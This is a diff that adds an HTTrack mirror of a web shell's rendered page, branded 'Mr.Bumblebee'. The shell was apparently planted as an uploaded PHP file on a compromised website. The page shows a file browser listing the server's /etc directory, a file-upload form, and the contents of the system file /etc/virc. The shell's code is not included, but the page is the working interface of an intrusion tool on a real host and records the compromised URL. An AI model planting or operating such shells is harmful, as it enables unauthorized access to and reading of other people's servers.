@@ -1,0 +1,122 @@
+<!DOCTYPE HTML>
+<html>
+
+<!-- Mirrored from genialhcpl.com/uplO&ded/5cd6c0026675d_mini.php?filesrc=//etc/virc&path=//etc by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Dec 2019 16:08:32 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<link href="#" rel="stylesheet" type="text/css">
+<title>Mr.Bumblebee</title>
+<center>
+<img src="../../i.imgur.com/wY37Uuf.jpg" style="opacity:0.5; width:150px; height:150px";></center>
+<style>
+body{
+font-family: "Tahoma";
+background-color: black;
+color:red;
+}
+#content tr:hover{
+background-color: #191919;
+text-shadow:0px 0px 10px #fff;
+}
+
+#content .first{
+background-color: #191919;
+}
+table{
+border: 1px #000000 dotted;
+}
+a{
+color:white;
+text-decoration: none;
+}
+a:hover{
+color:red;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 1px #000000 solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+</style>
+</head>
+<body>
+<h1><center><font color="red">-=[ Mr.</font><font color="white"> Bumblebee ]=-</font><br>
+			<font size="2px"><font color="red"><b>_Indonesia_</b></font>
+			</center></h1>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td><font color="lime">Path :</font> <a href="5cd6c0026675d_minia922.html?path=/">/</a><a href="5cd6c0026675d_mini1771.html?path=//etc">etc</a>/</td></tr><tr><td><form enctype="multipart/form-data" method="POST">
+<font color="lime">File Upload :</font> <input type="file" name="file" />
+<input type="submit" value="upload" />
+</form>
+</td></tr><tr><td>Current File : //etc/virc</tr></td></table><br /><pre>if v:lang =~ &quot;utf8$&quot; || v:lang =~ &quot;UTF-8$&quot;
+   set fileencodings=ucs-bom,utf-8,latin1
+endif
+
+set nocompatible	&quot; Use Vim defaults (much better!)
+set bs=indent,eol,start		&quot; allow backspacing over everything in insert mode
+&quot;set ai			&quot; always set autoindenting on
+&quot;set backup		&quot; keep a backup file
+set viminfo='20,\&quot;50	&quot; read/write a .viminfo file, don't store more
+			&quot; than 50 lines of registers
+set history=50		&quot; keep 50 lines of command line history
+set ruler		&quot; show the cursor position all the time
+
+&quot; Only do this part when compiled with support for autocommands
+if has(&quot;autocmd&quot;)
+  augroup redhat
+  autocmd!
+  &quot; In text files, always limit the width of text to 78 characters
+  &quot; autocmd BufRead *.txt set tw=78
+  &quot; When editing a file, always jump to the last cursor position
+  autocmd BufReadPost *
+  \ if line(&quot;'\&quot;&quot;) &gt; 0 &amp;&amp; line (&quot;'\&quot;&quot;) &lt;= line(&quot;$&quot;) |
+  \   exe &quot;normal! g'\&quot;&quot; |
+  \ endif
+  &quot; don't write swapfile on most commonly used directories for NFS mounts or USB sticks
+  autocmd BufNewFile,BufReadPre /media/*,/run/media/*,/mnt/* set directory=~/tmp,/var/tmp,/tmp
+  &quot; start with spec file template
+  autocmd BufNewFile *.spec 0r /usr/share/vim/vimfiles/template.spec
+  augroup END
+endif
+
+if has(&quot;cscope&quot;) &amp;&amp; filereadable(&quot;/usr/bin/cscope&quot;)
+   set csprg=/usr/bin/cscope
+   set csto=0
+   set cst
+   set nocsverb
+   &quot; add any database in current directory
+   if filereadable(&quot;cscope.out&quot;)
+      cs add $PWD/cscope.out
+   &quot; else add database pointed to by environment
+   elseif $CSCOPE_DB != &quot;&quot;
+      cs add $CSCOPE_DB
+   endif
+   set csverb
+endif
+
+&quot; Switch syntax highlighting on, when the terminal has colors
+&quot; Also switch on highlighting the last used search pattern.
+if &amp;t_Co &gt; 2 || has(&quot;gui_running&quot;)
+  syntax on
+  set hlsearch
+endif
+
+filetype plugin on
+
+if &amp;term==&quot;xterm&quot;
+     set t_Co=8
+     set t_Sb=[4%dm
+     set t_Sf=[3%dm
+endif
+
+&quot; Don't wake up system with blinking cursor:
+&quot; http://www.linuxpowertop.org/known.php
+let &amp;guicursor = &amp;guicursor . &quot;,a:blinkon0&quot;
+</pre><font color="red" size="2px"><center><br/><b>Copyright &copy; 2017 <font color="white">|| <font color="red">Recoded By <font color="white">Mr.Bumblebee</a></center></font>
+
+</body>
+
+<!-- Mirrored from genialhcpl.com/uplO&ded/5cd6c0026675d_mini.php?filesrc=//etc/virc&path=//etc by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Dec 2019 16:08:32 GMT -->
+</html>
